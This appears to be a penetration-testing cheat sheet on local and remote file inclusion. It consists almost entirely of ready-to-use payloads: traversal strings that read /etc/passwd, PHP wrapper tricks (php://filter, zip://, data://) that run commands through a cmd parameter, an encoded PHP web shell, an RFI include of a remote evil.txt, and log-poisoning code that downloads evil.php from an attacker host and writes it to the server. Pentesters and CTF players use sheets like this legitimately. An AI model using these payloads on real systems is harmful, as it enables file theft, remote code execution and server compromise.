# LFI RFI

### LFI Filter Bypass

{% code overflow="wrap" %}
```bash
# For site that append .php to the end of the url:
http://[URL]/?page=../../../../../../../etc/passwd&ext=

# For site that requires certain keyword:
http://[URL]/?page=[keyword])../../../../../../etc/passwd

# PHP tag base64 encode
php://filter/convert.base64-encode/resource=/etc/passwd

# Zip filter
zip://uploads/upload_1672890542.zip%23[filename inside zip]&cmd=id
# example /index.php?file=zip://uploads/upload_1672890542.zip%23phpbash
# example /index.php?file=zip://uploads/upload_1672890542.zip%23cmd&cmd=id

# URL encode
http://[URL]/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd

# Data filter
/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id 
# <?php system($_GET["cmd"]); ?>

# If site return error code on fail, use ffuf or burp intruder
c:\boot.ini for windows
```
{% endcode %}

### RFI

```bash
file=http://10.11.0.4/evil.txt
```

### LFI to RCE - Log Poisoning

```php
# Modify user agent
# Read /var/log/apache2/access.log
<?php file_put_contents('evil.php', file_get_contents('http://[IP_ADDR]/evil.php'))?>
<?php echo exec($_GET['cmd']) ; ?>
<?php echo shell_exec($_GET['cmd']);?>
```
